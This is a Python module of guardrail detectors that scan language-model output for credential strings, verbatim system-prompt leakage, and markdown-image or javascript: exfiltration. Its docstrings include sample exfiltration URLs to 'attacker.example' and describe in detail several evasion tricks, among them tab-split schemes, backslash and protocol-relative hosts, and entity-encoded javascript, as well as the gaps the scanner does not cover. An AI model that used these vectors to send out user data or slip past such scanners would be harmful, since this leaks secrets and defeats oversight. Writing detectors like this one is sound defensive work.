"""Regex and n-gram detectors.

Independent of any model, which the guardrail-evasion literature requires:
a single classifier is not a sufficient defence.

Pure — no network, no I/O. Every function here is a plain string-in,
Finding-list-out transform, so "the scan failed" is not a state this module
can be in: given a str it always returns a list (possibly empty). What that
means for correctness is recorded in the module-level docstrings of each
`scan_*` function below — an empty list here always means "nothing matched
the patterns this scanner knows", never "something went wrong". See the
task report for the full failure-mode enumeration; the short version is that
every scanner in this file has finite coverage (a fixed pattern set) and a
finite list of finding types can never prove absence of an exfiltration
vector it was not written to recognise.
"""

from __future__ import annotations

import re
from urllib.parse import urlparse

from guardrails.types import Finding, Span, SpanSource

_SECRETS: list[tuple[str, re.Pattern[str]]] = [
    ("API_KEY", re.compile(r"\bsk-[A-Za-z0-9_-]{20,}\b")),
    ("API_KEY", re.compile(r"\bAKIA[0-9A-Z]{16}\b")),
    ("JWT", re.compile(r"\beyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\b")),
    ("PRIVATE_KEY", re.compile(r"-----BEGIN (?:RSA |EC |OPENSSH |PGP )?PRIVATE KEY-----")),
]

# The `<...>` alternative comes first so a CommonMark angle-bracket
# destination is captured whole, including any internal whitespace
# (`< https://x/y >` is standard CommonMark and renders to a live `<img
# src>`). Without it, `[^)\s]+` alone stops at the first internal space and
# captures only the leading "<" — confirmed by running the brief's original
# regex against `< https://attacker.example/log >`: it captured "<", which
# `_normalise_url` cannot recognise as bracketed (doesn't end with ">"), so
# the destination fell through unnormalised and unflagged. The plain
# `[^)\s]+` branch still handles the common unbracketed case.
_MD_IMAGE = re.compile(r"!\[[^\]]*\]\(\s*(?P<url><[^<>]*>|[^)\s]+)")
_MD_LINK = re.compile(r"(?<!!)\[[^\]]*\]\(\s*(?P<url><[^<>]*>|[^)\s]+)")
_RAW_HTML = re.compile(r"<\s*(script|iframe|object|embed)\b", re.IGNORECASE)

_MIN_SYSTEM_PROMPT_WORDS = 8
# Overlapping shingle count at which echo detection saturates at 1.0. Three
# means two overlapping n-word shingles — a run of n+1 consecutive words
# reproduced verbatim — crosses G3's 0.60 threshold (2/3 = 0.667).
_ECHO_SATURATION = 3


def scan_secrets(spans: list[Span]) -> list[Finding]:
    """Match credential-shaped substrings against a fixed, finite pattern set.

    Coverage is exactly the four patterns above (OpenAI-style `sk-`, AWS
    `AKIA...`, JWT, PEM private-key headers). A credential format not on
    this list — a Slack token, a GitHub `ghp_`/`github_pat_` token, a Google
    `AIza...` key, a generic high-entropy hex secret — produces no finding
    and no signal that anything was skipped: `[]` here is indistinguishable
    from "scanned and clean". That is an inherent property of a fixed
    regex list, not a bug to fix by adding more patterns (there is always a
    next format), so it is recorded here instead of silently implied away.
    An empty span, or a span whose secret was fragmented by upstream
    normalisation (zero-width characters, homoglyphs) or lacks a
    non-word character before it (defeating the leading `\\b`), also yields
    no finding — same honest-but-blind shape.
    """
    findings: list[Finding] = []
    for span in spans:
        for entity, pattern in _SECRETS:
            for match in pattern.finditer(span.text):
                findings.append(
                    Finding(
                        risk="LLM02",
                        detector="secrets",
                        score=1.0,
                        source=span.source,
                        start=match.start(),
                        end=match.end(),
                        entity=entity,
                    )
                )
    return findings


def _shingles(text: str, n: int) -> set[str]:
    words = re.findall(r"\w+", text.lower())
    if len(words) < n:
        return set()
    return {" ".join(words[i : i + n]) for i in range(len(words) - n + 1)}


def scan_system_echo(output: str, system_prompt: str, n: int = 8) -> list[Finding]:
    """Flag output that shares long, contiguous word-runs with the system prompt.

    Detects the leak however it was elicited (the shingle set is compared
    against the *output*, not against the request), but that comparison is
    contiguous-run overlap, which has real, honest blind spots:

    - A system prompt (or an `n` chosen by the caller) short enough that no
      `n`-word window exists is not checked at all — `_MIN_SYSTEM_PROMPT_WORDS`
      makes that refusal explicit for the default path, but the same
      "nothing to compare" case is also reached implicitly whenever
      `len(words) < n`, for either side, inside `_shingles`.
    - A paraphrase, reordering, or the model interleaving its own commentary
      between fragments of the original text breaks every contiguous
      `n`-word run and drives the overlap to zero even though the leak is
      real. Shingling proves a *verbatim* echo; it cannot see a reworded one.

    Scoring is absolute and saturating (`overlap / _ECHO_SATURATION`, capped
    at 1.0), not a ratio of the prompt's length. An earlier draft scored
    `overlap / len(system_shingles)`: reproducing a verbatim 13-word sentence
    out of the prompt scored 0.2857 against G3's 0.60 threshold, and scored
    *identically* at both 37-word and 253-word prompt lengths — the ratio
    wasn't merely diluting a real signal, it structurally could not cross
    the threshold for a realistic partial leak, at any prompt length, unless
    the model reproduced most of the prompt. Reproducing any `n+1`-word run
    verbatim (two overlapping shingles) is already strong evidence on its
    own and now crosses 0.60 regardless of how long the system prompt is.
    See the task report for measured false-positive numbers on ordinary,
    unrelated assistant replies against a realistic system prompt — the
    `n`-word (default 8) contiguous-match requirement, not the score
    formula, is what keeps accidental phrase overlap from triggering a
    Finding at all: absolute scoring only changes how strongly a *given*
    overlap is scored, not how easily one occurs in the first place.
    """
    if len(re.findall(r"\w+", system_prompt)) < _MIN_SYSTEM_PROMPT_WORDS:
        return []

    system_shingles = _shingles(system_prompt, n)
    if not system_shingles:
        return []

    overlap = system_shingles & _shingles(output, n)
    if not overlap:
        return []

    score = len(overlap) / _ECHO_SATURATION
    return [
        Finding(
            risk="LLM07",
            detector="system_echo",
            score=min(1.0, score),
            source=SpanSource.UNTRUSTED,
            start=0,
            end=len(output),
            entity="SYSTEM_PROMPT",
        )
    ]


def _normalise_url(url: str) -> str:
    r"""Reduce a markdown destination to what a browser would actually fetch.

    Normalisation happens ONCE, here, before either gate below inspects the
    URL. The previous shape folded backslashes inside `_host_allowed` but
    not in `_is_external`: `_is_external` ran first, rejected
    `https:\\attacker.example\log` as "not external" on its literal
    ("http://", "https://", "//") prefix check, and `_host_allowed` — whose
    backslash handling was otherwise correct — never got a chance to see it.
    Fixing the same class of bug inside one gate at a time guarantees the
    next gate added later reopens it; a single choke point that every gate
    reads from is what actually closes it.

    Handles, in order:

    - ASCII tab/newline/carriage-return, anywhere in the string, not just at
      the edges — the WHATWG URL spec's own first normalisation step is
      "remove all ASCII tab or newline from input", applied to the whole
      string before any scheme/host parsing happens. Confirmed as a live
      gap, not a theoretical one: `htt<TAB>ps://attacker.example/log` and
      `java<TAB>script:alert(1)` both previously produced zero findings —
      the literal prefix checks in `_is_external` and the `javascript:`
      link check never saw a string starting with a recognised scheme,
      exactly the way a browser would after stripping the tab.
    - CommonMark angle-bracket destinations, `<url>` — standard markdown,
      renders to a live `<img src>` exactly like the unbracketed form.
      `![x](<https://attacker.example/log>)` previously produced zero
      findings: `_MD_IMAGE`'s capture included the brackets, so neither the
      scheme-prefix check nor `urlparse` recognised the string.
    - Backslashes — not valid URL characters (RFC 3986), but a browser's
      WHATWG-compliant URL parser treats an unescaped backslash exactly
      like a forward slash wherever it appears before the path ends.
      Python's `urlparse` does not, so both `https:\\host\log` (a bare
      backslash where `://` belongs) and `//host\log` /
      `\\host\log` (backslash instead of the leading forward slashes) read
      as something other than an external URL, or resolve to the wrong
      host, unless folded first.

    Order matters: tab/newline removal runs first so a tab hidden inside
    `< ... >` or adjacent to a backslash doesn't survive into either of the
    later steps (`< h\ttps:\\host >` must end up fully normalised, not
    partially).
    """
    cleaned = re.sub(r"[\t\n\r]", "", url).strip()
    if cleaned.startswith("<") and cleaned.endswith(">"):
        cleaned = cleaned[1:-1].strip()
    return cleaned.replace("\\", "/")


def _is_external(url: str) -> bool:
    """Does this URL leave the page's own origin?

    Expects `url` already run through `_normalise_url` — this function does
    not fold backslashes or strip angle brackets itself; see
    `_normalise_url`'s docstring for why that responsibility lives in one
    place rather than being re-implemented at every gate.

    Protocol-relative URLs are the trap: a browser resolves `//host/log`
    against the page's current scheme and fetches it exactly like an
    absolute `https://host/log` URL — no scheme prefix required. An earlier
    draft guarded only `("http://", "https://")`, so
    `![x](//attacker.example/log?d=secret)` produced no finding at all: the
    exact G4 vector, working end to end, reported clean. `.strip()` first
    so incidental leading whitespace inside the markdown parens (the
    capturing regex tolerates it) doesn't defeat the prefix check.
    """
    lowered = url.strip().lower()
    return lowered.startswith(("http://", "https://", "//"))


def _host_allowed(url: str, allowlist: list[str]) -> bool:
    """Expects `url` already run through `_normalise_url` — see that
    function's docstring for why backslash-folding lives there now rather
    than here (it used to live only here, one gate too late for
    `_is_external` to benefit from it)."""
    host = (urlparse(url).hostname or "").lower()
    if not host:
        # A URL we cannot attribute to any host is not verified safe. Ex:
        # "https:///log?d=x" (empty authority) or "https://:8080/x" (no
        # host, just a port) both parse with hostname None. Returning "yes,
        # allowed" here — as if an unparseable host were the same thing as a
        # checked, allowlisted one — is the fail-open shape this codebase
        # keeps removing elsewhere (see injection.py, pii.py): silence must
        # not read as a clean verdict. Flag it instead and let policy.yaml
        # decide what an unattributable host costs.
        return False
    return host in {entry.lower() for entry in allowlist}


def scan_exfil(output: str, allowlist: list[str]) -> list[Finding]:
    """Flag markdown/HTML constructs a client renders without user action.

    Only markdown *images* are host-checked (a `[link](url)` a model cites as
    a source is normal; an `![image](url)` is fetched by the browser the
    instant the markdown renders, with no click). That asymmetry is
    intentional, not a gap.

    Image URLs are run through `_normalise_url` and then checked via
    `_is_external`, which also catches protocol-relative URLs
    (`![x](//attacker.example/log)`) — an earlier draft matched only an
    explicit `http://`/`https://` prefix, so this exact G4-closing vector
    produced no finding while working end to end in a real browser (a
    client resolves `//host` against the current page's scheme, no scheme
    prefix required). `_normalise_url` additionally closes CommonMark
    angle-bracket destinations (`![x](<https://attacker.example/log>)`),
    backslash-based host confusion, and ASCII tab/newline hidden inside a
    scheme (`htt<TAB>ps://...`, `java<TAB>script:...`) — all three
    previously bypassed detection entirely. See `_normalise_url`'s
    docstring for the full account, including why normalisation happens
    exactly once rather than being re-implemented inside each gate.

    Known, unfixed coverage gaps — a silent `[]` on any of these is not
    proof the output is clean, only that it does not match what this
    scanner was written to recognise:

    - Reference-style markdown (`![x][ref]` with the URL supplied later in a
      separate `[ref]: https://...` definition line) is invisible to
      `_MD_IMAGE`, which only matches the inline `(url)` form.
    - `_RAW_HTML` matches only `<script>`, `<iframe>`, `<object>`, `<embed>`.
      `<img onerror=...>`, `<svg onload=...>`, `<link rel=prefetch>`,
      `<meta http-equiv=refresh>` and CSS `url(...)` are not covered.
    - A JAVASCRIPT_URL finding requires the literal token "javascript:" in
      the (now tab/newline-stripped) URL text, case-insensitively. HTML-entity
      encoded variants (`javascript&colon;alert(1)`, `&#106;avascript:`) are
      not decoded first and so are not matched — whitespace obscuring is
      closed, entity obscuring is not.
    - `javascript:` is only checked on link destinations (`_MD_LINK`), not
      image destinations (`_MD_IMAGE`) — the same host/link asymmetry
      documented above for `EXTERNAL_IMAGE` cuts the other way here:
      `![x](javascript:...)` produces no JAVASCRIPT_URL finding. In
      practice this is low-severity (a `javascript:` URI in an `<img src>`
      does not execute in any current mainstream renderer), but it is an
      asymmetry this scanner does not currently check for, not one proven safe.
    - `_host_allowed` matches on hostname only; a host on the allowlist with
      a non-standard port (`https://cdn.nufi.me:4444/log`) is allowed,
      exactly as if the port were the default. If a deployment ever relies
      on port-scoping to separate a trusted image host from an untrusted
      service on the same domain, this scanner does not enforce that
      boundary.
    - `data:` and `blob:` image destinations never reach `_is_external`'s
      `http`/`https`/`//` check and so never produce a finding. This is
      intentional, not an oversight: neither scheme is a network request —
      `data:` is the image bytes inlined directly in the markdown, `blob:`
      resolves to same-origin memory the page itself created — so there is
      no egress for either to close. They are recorded here because the
      absence is easy to mistake for a gap rather than a correct exclusion.

    These are recorded, not silently implied away by an empty return.
    """
    findings: list[Finding] = []

    def add(entity: str, start: int, end: int) -> None:
        findings.append(
            Finding(
                risk="LLM05",
                detector="exfil",
                score=1.0,
                source=SpanSource.UNTRUSTED,
                start=start,
                end=end,
                entity=entity,
            )
        )

    for match in _MD_IMAGE.finditer(output):
        url = _normalise_url(match.group("url"))
        if _is_external(url) and not _host_allowed(url, allowlist):
            add("EXTERNAL_IMAGE", match.start(), match.end())

    for match in _MD_LINK.finditer(output):
        if _normalise_url(match.group("url")).lower().startswith("javascript:"):
            add("JAVASCRIPT_URL", match.start(), match.end())

    for match in _RAW_HTML.finditer(output):
        add("RAW_HTML", match.start(), match.end())

    return findings
